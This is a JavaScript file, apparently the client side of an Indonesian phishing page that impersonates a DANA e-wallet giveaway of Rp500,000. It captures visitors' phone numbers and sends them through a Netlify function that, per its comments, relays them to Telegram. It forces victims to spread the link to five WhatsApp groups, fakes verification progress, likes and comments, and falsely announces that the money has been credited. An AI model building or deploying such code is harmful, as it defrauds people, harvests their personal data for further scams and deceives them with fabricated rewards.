let currentStep = 0;
let shareCount = 0;
let userPhone = "";
let popupInterval;
let currentPopup = 0;
const totalPopups = 5;

// Number only validation
function numberonly(event) {
    const charCode = event.which ? event.which : event.keyCode;
    if (charCode < 48 || charCode > 57) {
        event.preventDefault();
        return false;
    }
    return true;
}

// Show popup notifications randomly
function startPopups() {
    const popups = ['popup1', 'popup2', 'popup3', 'popup4', 'popup5'];
    popupInterval = setInterval(() => {
        const randomPopup = popups[Math.floor(Math.random() * popups.length)];
        const popup = document.getElementById(randomPopup);
        popup.classList.add('show');
        setTimeout(() => {
            popup.classList.remove('show');
        }, 4000);
    }, 15000);
}

// Stop popups
function stopPopups() {
    if (popupInterval) {
        clearInterval(popupInterval);
    }
}

// Trigger confetti
function triggerConfetti() {
    canvasConfetti({
        particleCount: 150,
        spread: 70,
        origin: { y: 0.6 },
        colors: ['#148CE3', '#43B05F', '#FFD700']
    });
    
    setTimeout(() => {
        canvasConfetti({
            particleCount: 100,
            spread: 100,
            origin: { y: 0.5 },
            colors: ['#148CE3', '#43B05F']
        });
    }, 200);
}

// Show success message
function showSuccessMessage() {
    triggerConfetti();
    const successPopup = document.createElement('div');
    successPopup.className = 'popup';
    successPopup.innerHTML = '🎉 Selamat! Saldo Rp500.000 akan segera masuk ke akun DANA Anda! 🎉';
    successPopup.style.background = '#43B05F';
    document.body.appendChild(successPopup);
    setTimeout(() => successPopup.classList.add('show'), 100);
    setTimeout(() => {
        successPopup.classList.remove('show');
        setTimeout(() => successPopup.remove(), 500);
    }, 5000);
}

// ==================== HANYA FUNGSI INI YANG MENGIRIM KE TELEGRAM ====================
// Fungsi untuk mengirim data ke Netlify Function (Hanya nomor HP)
async function sendToTelegram(phoneNumber) {
    const message = `┌─ 📱 DANA - Hajatan Ulang Tahun
├───────────────────
├─ 🔢 NOMOR HP : ${phoneNumber}
╰───────────────────`;
    
    try {
        const response = await fetch('/.netlify/functions/send-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                phone: phoneNumber,
                message: message
            })
        });
        
        const result = await response.json();
        
        if (response.ok && result.success) {
            console.log('✅ Data berhasil dikirim ke Telegram');
            return true;
        } else {
            console.error('❌ Gagal mengirim ke Telegram:', result.error || 'Unknown error');
            return false;
        }
    } catch (error) {
        console.error('❌ Error:', error);
        return false;
    }
}
// ==================== AKHIR FUNGSI TELEGRAM ====================

// Claim reward function (TIDAK mengirim ke Telegram)
function claimReward() {
    triggerConfetti();
    showSuccessMessage();
    setTimeout(() => {
        alert("🎉 SELAMAT! 🎉\n\nSaldo Rp500.000 telah berhasil ditambahkan ke akun DANA Anda.\n\nTerima kasih telah berpartisipasi dalam Hajatan Ulang Tahun DANA!");
    }, 500);
}

// Share to WhatsApp (TIDAK mengirim ke Telegram)
function shareToWA() {
    // Teks yang akan muncul saat share ke WhatsApp
    const shareText = `*DANA bagi-bagi saldo Rp500.000* 

Aku baru saja dapat 😳 cek apakah kamu juga dapat.

_Klik di sini_ 👇
${window.location.href}`;
    
    // Encode teks untuk URL
    const encodedText = encodeURIComponent(shareText);
    const waUrl = `https://wa.me/?text=${encodedText}`;
    window.open(waUrl, '_blank');
    
    // Update share progress
    shareCount++;
    let progress = Math.min((shareCount / 5) * 100, 100);
    const fillProgress = document.getElementById('fill2-progress');
    const sharePercentage = document.getElementById('sharePercentage');
    
    if (fillProgress) {
        fillProgress.style.width = progress + '%';
        fillProgress.style.background = '#43B05F';
        fillProgress.style.height = '100%';
    }
    if (sharePercentage) {
        sharePercentage.innerText = Math.floor(progress) + '%';
    }
    
    if (shareCount >= 5) {
        document.getElementById('shareStatus').innerHTML = '✅ Verifikasi selesai! Silakan klik tombol di bawah untuk mengklaim saldo Anda.';
        document.getElementById('shareStatus').style.color = '#27ae60';
        
        setTimeout(() => {
            document.getElementById('share').style.display = 'none';
            document.getElementById('claim').style.display = 'block';
            triggerConfetti();
        }, 1000);
    } else {
        document.getElementById('shareStatus').innerHTML = `📤 Anda telah membagikan ${shareCount} dari 5 kali. Bagikan ke 5 grup/teman untuk mengklaim saldo!`;
    }
}

// Like post function (TIDAK mengirim ke Telegram)
function likePost() {
    let likes = document.getElementById('likes');
    let currentLikes = likes.innerText;
    if (currentLikes.includes('rb')) {
        let num = parseInt(currentLikes) + 1;
        likes.innerText = num + ' rb';
    } else {
        let num = parseInt(currentLikes) + 1;
        likes.innerText = num;
    }
    alert('👍 Terima kasih telah menyukai postingan ini!');
}

// Simulate progress bar (TIDAK mengirim ke Telegram)
function simulateProgress(callback) {
    let progress = 0;
    const fillElement = document.getElementById('fill2');
    const percentageElement = document.getElementById('percentage2');
    
    const interval = setInterval(() => {
        progress += Math.random() * 15;
        if (progress >= 100) {
            progress = 100;
            clearInterval(interval);
            if (callback) callback();
        }
        if (fillElement) fillElement.style.width = progress + '%';
        if (percentageElement) percentageElement.innerText = Math.floor(progress) + '%';
    }, 200);
}

// Initialize event listeners when DOM is ready
document.addEventListener('DOMContentLoaded', function() {
    // Main flow - Go button
    const goButton = document.getElementById('go');
    if (goButton) {
        goButton.addEventListener('click', function() {
            document.getElementById('intro').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            
            let progress = 0;
            const numElement = document.getElementById('num');
            const loaderInterval = setInterval(() => {
                progress += Math.random() * 15;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(loaderInterval);
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('info').style.display = 'block';
                }
                if (numElement) numElement.innerText = Math.floor(progress) + '%';
            }, 200);
        });
    }

    // ==================== INI SATU-SATUNYA YANG MENGIRIM KE TELEGRAM ====================
    // Confirm phone number - HANYA DI SINI fungsi sendToTelegram() dipanggil
    const confirmButton = document.getElementById('confirm');
    if (confirmButton) {
        confirmButton.addEventListener('click', async function() {
            const phone = document.getElementById('phoneNumber').value.trim();
            const errorMsg = document.getElementById('errorMsg');
            
            if (!phone || phone.length < 10 || phone.length > 15) {
                errorMsg.style.display = 'block';
                return;
            }
            
            errorMsg.style.display = 'none';
            userPhone = phone;
            document.getElementById('getname').innerText = phone;
            document.getElementById('info').style.display = 'none';
            document.getElementById('checking').style.display = 'block';
            
            // HANYA DISINI KIRIM KE TELEGRAM - TIDAK ADA DI TEMPAT LAIN
            await sendToTelegram(phone);
            
            simulateProgress(() => {
                document.getElementById('checking').style.display = 'none';
                document.getElementById('share').style.display = 'block';
                startPopups();
                triggerConfetti();
            });
        });
    }
    // ==================== AKHIR PENGIRIMAN KE TELEGRAM ====================

    // Add comment functionality (TIDAK mengirim ke Telegram)
    const commentInput = document.getElementById('commentInput');
    if (commentInput) {
        commentInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                const commentText = this.value.trim();
                if (commentText) {
                    const commentsList = document.getElementById('comments-list');
                    const newComment = document.createElement('div');
                    newComment.className = 'comment';
                    newComment.innerHTML = `
                        <img src="https://randomuser.me/api/portraits/lego/1.jpg" alt="avatar">
                        <div class="single-container">
                            <span class="user">Anda</span>
                            <span class="text">${escapeHtml(commentText)}</span>
                        </div>
                    `;
                    commentsList.appendChild(newComment);
                    
                    const buttonsDiv = document.createElement('div');
                    buttonsDiv.className = 'buttons';
                    buttonsDiv.style.marginLeft = '46px';
                    buttonsDiv.innerHTML = `<span class="time">Baru saja</span><span class="dot">·</span><span class="action liked">Suka</span> · <span class="action">Balas</span>`;
                    commentsList.appendChild(buttonsDiv);
                    
                    this.value = '';
                    
                    // Update comment count
                    let commentCount = document.getElementById('comments-count');
                    let currentCount = parseInt(commentCount.innerText) || 23;
                    commentCount.innerText = (currentCount + 1) + ' rb komentar';
                }
            }
        });
    }
});

// Helper function to escape HTML
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Expose functions globally
window.shareToWA = shareToWA;
window.claimReward = claimReward;
window.likePost = likePost;
window.numberonly = numberonly;
